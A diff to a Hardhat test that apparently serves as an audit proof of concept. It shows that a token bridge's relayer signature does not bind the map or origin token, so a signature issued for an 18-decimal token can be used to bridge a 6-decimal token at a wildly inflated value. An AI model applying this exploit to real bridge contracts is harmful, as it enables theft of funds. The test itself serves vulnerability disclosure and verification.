@@ -2,13 +2,13 @@ import hre from "hardhat";
 import {expect} from "chai";
 
 describe("Finding 1 - mapId/originToken not bound to relayer signature", function () {
-  it("accepts a signature issued for map 1 when the caller submits map 2", async function () {
+  it("accepts a signature issued for 18-decimal Token A when caller submits 6-decimal Token B", async function () {
     const [, multisig, emergency, relayer, user] = await hre.ethers.getSigners();
 
     const Token = await hre.ethers.getContractFactory("PocToken");
-    const tokenA = await Token.deploy();
-    const tokenB = await Token.deploy();
-    const targetToken = await Token.deploy();
+    const tokenA = await Token.deploy(18);
+    const tokenB = await Token.deploy(6);
+    const targetToken = await Token.deploy(18);
 
     const Mapper = await hre.ethers.getContractFactory(
       "contracts/main/modules/mapper/Mapper.sol:Mapper"
@@ -59,17 +59,18 @@ describe("Finding 1 - mapId/originToken not bound to relayer signature", functio
     expect(mapA.targetTokenAddress).to.equal(mapB.targetTokenAddress);
     expect(mapA.originTokenAddress).to.not.equal(mapB.originTokenAddress);
 
-    const amount = hre.ethers.parseEther("100");
+    // Same raw amount means 100 Token A (18 decimals) but 100 trillion Token B (6 decimals).
+    const amount = 100n * 10n ** 18n;
     await (await tokenB.transfer(user.address, amount)).wait();
     await (await tokenB.connect(user).approve(await bridge.getAddress(), amount)).wait();
 
     const toAddress = b32(user.address);
     const gasAmount = 0n;
     const deadline = BigInt((await hre.ethers.provider.getBlock("latest"))!.timestamp) + 3600n;
-    const salt = hre.ethers.keccak256(hre.ethers.toUtf8Bytes("finding-1-poc"));
+    const salt = hre.ethers.keccak256(hre.ethers.toUtf8Bytes("finding-1-decimals-poc"));
 
     const signedHash = hre.ethers.solidityPackedKeccak256(
-      ["address", "bytes32", "bytes32", "uint256", "uint256", "uint256", "uint256", "uint64", "bytes32"],
+      ["address", "bytes32", "bytes32", "uint256", "uint256", "uint256", "uint64", "bytes32"],
       [
         user.address,
         toAddress,
@@ -86,7 +87,6 @@ describe("Finding 1 - mapId/originToken not bound to relayer signature", functio
     const signature = await relayer.signMessage(hre.ethers.getBytes(signedHash));
     const sig = hre.ethers.Signature.from(signature);
 
-    const beforeA = await tokenA.balanceOf(await bridge.getAddress());
     const beforeB = await tokenB.balanceOf(await bridge.getAddress());
 
     const tx = await bridge.connect(user).bridgeTokens(
@@ -109,20 +109,16 @@ describe("Finding 1 - mapId/originToken not bound to relayer signature", functio
         mapB.targetChainId
       );
 
-    const afterA = await tokenA.balanceOf(await bridge.getAddress());
     const afterB = await tokenB.balanceOf(await bridge.getAddress());
 
-    expect(afterA - beforeA).to.equal(0n);
     expect(afterB - beforeB).to.equal(amount);
-    expect(await bridge.usedHashes(signedHash)).to.equal(true);
 
-    const differentTargetHash = hre.ethers.solidityPackedKeccak256(
-      ["address", "bytes32", "bytes32", "uint256", "uint256", "uint256", "uint256", "uint64", "bytes32"],
-      [
-        user.address, toAddress, b32(await tokenA.getAddress()), gasAmount,
-        amount, mapB.originChainId, mapB.targetChainId, deadline, salt
-      ]
-    );
-    expect(differentTargetHash).to.not.equal(signedHash);
+    console.log("Token A amount represented by signed raw amount:", hre.ethers.formatUnits(amount, 18));
+    console.log("Token B amount actually locked:", hre.ethers.formatUnits(amount, 6));
+    console.log("Raw amount locked:", amount.toString());
+
+    expect(hre.ethers.formatUnits(amount, 18)).to.equal("100.0");
+    expect(hre.ethers.formatUnits(amount, 6)).to.equal("100000000000000");
+    expect(await bridge.usedHashes(signedHash)).to.equal(true);
   });
 });
